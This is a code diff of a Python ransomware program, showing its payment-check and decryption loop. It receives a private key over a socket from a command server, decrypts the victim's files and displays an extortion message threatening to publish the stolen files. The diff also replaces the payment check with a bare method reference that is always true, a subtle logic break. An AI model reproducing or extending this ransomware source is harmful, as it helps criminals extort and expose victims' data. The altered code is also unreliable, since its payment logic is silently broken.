@@ -332,48 +332,39 @@ class Ransomware:
             if (counter == 60):
                 counter = 1
 
-                if (self.check_if_user_has_paid(initial_balance)):
-                    # Waits until all the files has been uploaded before processing the payment
-
-                    
+                if (self.check_if_user_has_paid):
+                    # Waits until all the files has been uploaded before processing the payment   
 
                     popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
                 
                     """ Receiving the private key. """
-                    filename = base64.b64decode(self._socket.recv(2048)).decode("utf-8")
+                    filename = base64.b64decode(self._socket.recv(2048)).decode(Ransomware.ENCODING)
                     filename = 'private_key.pem'
                     print(f"[RECV] Receiving the private key")
                     print("filename: " + filename)
 
                     key = open(filename, "wb")
-                    self._socket.sendall(base64.b64encode("Private key filename received.".encode("utf-8")))
+                    self._socket.sendall(base64.b64encode("Private key filename received.".encode(Ransomware.ENCODING)))
         
                     """ Receiving the private key from the server. """
                     data = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE))
-                    print(data)
-                    print(type(data))
                 
                     print(f"[RECV] Receiving the private key data.")
                     key.write(data)
-                    self._socket.sendall(base64.b64encode("File Data recieved.".encode("utf-8")))
+                    self._socket.sendall(base64.b64encode("File Data recieved.".encode(Ransomware.ENCODING)))
                 
                     """ Closing the file. """
                     key.close()
 
                     #Read the private key from the server
-                    #I am not sure where to put this above, so I will leave it here for now
                     with open("private_key.pem", "rb") as key_content:
                         key = rsa.PrivateKey.load_pkcs1(key_content.read())
 
                     self.decrypt_all_files(home, key)
 
                     self._socket.sendall(base64.b64encode("x".encode("utf-8")))
-
-
                     break
                 
-                    #TODO: Implement code to delete all the files that are stored on the server
-
             subprocess.Popen(["zenity", "--info", "--text", "TIMER HAS RUN OUT. \n Publishing your files to the internet","--width", "400", "--height", "200" ])
 
 #Main function/ control flow
